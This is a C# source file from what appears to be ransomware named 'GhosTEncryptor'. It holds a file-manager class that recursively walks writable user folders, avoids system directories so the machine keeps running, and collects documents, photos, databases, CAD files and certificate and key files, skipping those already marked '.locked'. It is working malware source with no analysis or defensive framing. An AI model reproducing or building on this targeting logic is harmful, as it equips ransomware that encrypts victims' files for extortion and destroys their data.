using System;
using System.IO;

namespace GhosTEncryptor.FileManager;

public class NManager
{
	private string files;

	public string[] GetFiles(string[] directories)
	{
		string[] separator = new string[1] { "\n" };
		string text = string.Empty;
		for (int i = 0; i < directories.Length; i++)
		{
			string[] array = Directory.GetFiles(directories[i]);
			foreach (string text2 in array)
			{
				text = text + text2 + "\n";
			}
		}
		return text.Split(separator, StringSplitOptions.RemoveEmptyEntries);
	}

	private static string[] DeepSearch(string[] directories)
	{
		string[] separator = new string[1] { "\n" };
		string text = string.Empty;
		for (int i = 0; i < directories.Length; i++)
		{
			string[] array = Directory.GetFiles(directories[i]);
			foreach (string text2 in array)
			{
				if (!text2.Contains(".locked") && (text2.Contains(".pdf") || text2.Contains(".png") || text2.Contains(".odt") || text2.Contains(".ods") || text2.Contains(".odp") || text2.Contains(".odm") || text2.Contains(".odc") || text2.Contains(".odb") || text2.Contains(".wps") || text2.Contains(".xls") || text2.Contains(".xlsx") || text2.Contains(".xlsm") || text2.Contains(".xlsb") || text2.Contains(".xlk") || text2.Contains(".ppt") || text2.Contains(".pptx") || text2.Contains(".pptm") || text2.Contains(".mdb") || text2.Contains(".accdb") || text2.Contains(".pst") || text2.Contains(".dwg") || text2.Contains(".dxf") || text2.Contains(".dxg") || text2.Contains(".wpd") || text2.Contains(".rtf") || text2.Contains(".wb2") || text2.Contains(".mdf") || text2.Contains(".dbf") || text2.Contains(".psd") || text2.Contains(".pdd") || text2.Contains(".eps") || text2.Contains(".ai") || text2.Contains(".indd") || text2.Contains(".cdr") || text2.Contains(".jpg") || text2.Contains(".doc") || text2.Contains(".jpe") || text2.Contains(".dng") || text2.Contains(".3fr") || text2.Contains(".arw") || text2.Contains(".srf") || text2.Contains(".sr2") || text2.Contains(".bay") || text2.Contains(".crw") || text2.Contains(".cr2") || text2.Contains(".dcr") || text2.Contains(".kdc") || text2.Contains(".erf") || text2.Contains(".mef") || text2.Contains(".mrw") || text2.Contains(".nef") || text2.Contains(".nrw") || text2.Contains(".orf") || text2.Contains(".raf") || text2.Contains(".raw") || text2.Contains(".rwl") || text2.Contains(".rw2") || text2.Contains(".r3d") || text2.Contains(".ptx") || text2.Contains(".pef") || text2.Contains(".srw") || text2.Contains(".x3f") || text2.Contains(".der") || text2.Contains(".cer") || text2.Contains(".crt") || text2.Contains(".pem") || text2.Contains(".pfx") || text2.Contains(".p12") || text2.Contains(".p7b") || text2.Contains(".p7c") || text2.Contains(".docx") || text2.Contains(".docm") || text2.Contains(".lnk")))
				{
					text = text + text2 + "\n";
				}
			}
		}
		return text.Split(separator, StringSplitOptions.RemoveEmptyEntries);
	}

	public string[] GetAllFolders(string path)
	{
		string[] separator = new string[1] { "\n" };
		string[] directories = Directory.GetDirectories(path);
		foreach (string text in directories)
		{
			if (HasWritePermissionOnDir(text) && !text.Contains("Windows") && !text.Contains("Program Files") && !text.Contains("Program Files (x86)") && !text.Contains("ProgramData") && !text.Contains("AppData") && !text.Contains("Microsoft") && !text.Contains("All Users"))
			{
				files = files + text + "\n";
				GetAllFolders(text);
			}
		}
		return files.Split(separator, StringSplitOptions.RemoveEmptyEntries);
	}

	private bool HasWritePermissionOnDir(string path)
	{
		try
		{
			Directory.GetDirectories(path);
			return true;
		}
		catch (UnauthorizedAccessException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}
}
